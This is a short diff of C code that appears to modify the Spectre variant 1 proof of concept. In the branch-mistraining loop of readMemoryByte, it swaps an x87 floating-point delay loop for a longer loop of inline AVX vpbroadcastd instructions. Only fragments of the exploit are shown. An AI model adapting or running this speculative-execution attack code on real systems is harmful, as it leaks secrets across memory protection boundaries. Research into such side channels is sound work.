@@ -1,5 +1,3 @@
-
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -62,19 +60,16 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
-      float a = 1.11, b = 4.77;
-      int i;
-      for (i = 0; i < 200; i++) {
-        __asm__ (
-        "fld %1;"
-        "fld %2;"
-        "fadd;"
-        "fstp %0;"
-        : "=m" (a)
-        : "m" (a), "m" (b)
+      for (i = 0; i < 2500; i++){
+        __asm__(
+          "vpbroadcastd %xmm0,%ymm0\n\t"
+          "vpbroadcastd %xmm1,%ymm1\n\t"
+          "vpbroadcastd %xmm2,%ymm2\n\t"
+          "vpbroadcastd %xmm0,%ymm0\n\t"
+          "vpbroadcastd %xmm1,%ymm1\n\t"
+          "vpbroadcastd %xmm2,%ymm2\n\t"
         );
-       }
-
+      }
       victim_function(x);
 
     }
